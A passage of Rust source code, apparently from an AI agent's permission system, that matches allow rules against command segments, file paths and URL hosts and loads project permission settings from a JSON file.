) -> Option<&'a Sourced> {
    let named: Vec<&Sourced> = allow.iter().filter(|s| s.rule.names(tool)).collect();
    if let Some(any) = named.iter().find(|s| matches!(s.rule.spec, Spec::Any)) {
        return Some(any);
    }
    match subject {
        Subject::Command(_) => {
            if segments.is_empty() || segments.iter().any(|s| s.opaque) {
                return None;
            }
            let mut first = None;
            for segment in segments {
                let covering = named.iter().find(|s| match &s.rule.spec {
                    Spec::Command(pattern) => pattern.matches(&segment.text),
                    _ => false,
                })?;
                first.get_or_insert(*covering);
            }
            first
        }
        Subject::Paths(paths) => {
            if paths.is_empty() {
                return None;
            }
            let mut first = None;
            for path in paths {
                let covering = named.iter().find(|s| match &s.rule.spec {
                    Spec::Path(pattern) => pattern.matches(path, ctx),
                    _ => false,
                })?;
                first.get_or_insert(*covering);
            }
            first
        }
        Subject::Url(url) => named
            .iter()
            .find(|s| matches!(&s.rule.spec, Spec::Domain(d) if host_matches(url, d)))
            .copied(),
        Subject::None => None,
    }
}

fn host_matches(url: &str, domain: &str) -> bool {
    let Ok(parsed) = reqwest::Url::parse(url) else {
        return false;
    };
    let Some(host) = parsed.host_str() else {
        return false;
    };
    let host = host.to_ascii_lowercase();
    host == domain || host.ends_with(&format!(".{domain}"))
}

/// The project's lists, from [`PROJECT_SETTINGS`]. `None` when there is no
/// file, or no `permissions` in it.
fn read_project(workspace: &Path) -> Result<Option<RuleLists>, String> {
    #[derive(Deserialize)]
    struct ProjectSettings {
        #[serde(default)]
        permissions: Option<RuleLists>,
    }
    let path = workspace.join(PROJECT_SETTINGS);
    let text = match std::fs::read_to_string(&path) {
        Ok(text) => text,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(format!("could not read {}: {e}", path.display())),
    };
    if text.trim().is_empty() {
        return Ok(None);
    }
    serde_json::from_str::<ProjectSettings>(&text)
        .map(|s| s.permissions)
        .map_err(|e| format!("{} is not valid settings: {e}", path.display()))
}

#[cfg(test)]
#[path = "rules_tests.rs"]
mod tests;
